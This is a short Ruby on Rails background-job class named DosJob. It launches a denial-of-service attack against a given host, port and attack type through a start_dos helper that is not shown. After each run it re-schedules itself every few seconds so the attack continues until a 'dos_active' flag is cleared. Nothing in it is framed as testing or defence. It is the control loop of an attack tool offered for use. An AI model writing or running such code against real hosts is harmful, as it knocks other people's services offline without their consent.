class DosJob < ApplicationJob
  queue_as :client_dos

  include DosHelper

  rescue_from(StandardError) do |exception|
    dos_log("msg[debug]: #{exception.to_s}")

    Parameter.find_by(code: 'dos_active').update(value: 'false') if !exception.is_a?(CustomError) || !exception.dos_ongoing?
  end

  def perform(*args)
    result = start_dos(host_target: args.first[:host_target], port: args.first[:port], timeout: 5, type: args.first[:type])
    raise result if result.is_a?(CustomError)

    time = Parameter.dos_slow ? 8.seconds : 2.seconds
    DosJob.set(wait: time).perform_later({host_target: args.first[:host_target], port: args.first[:port], type: args.first[:type]})
  end
end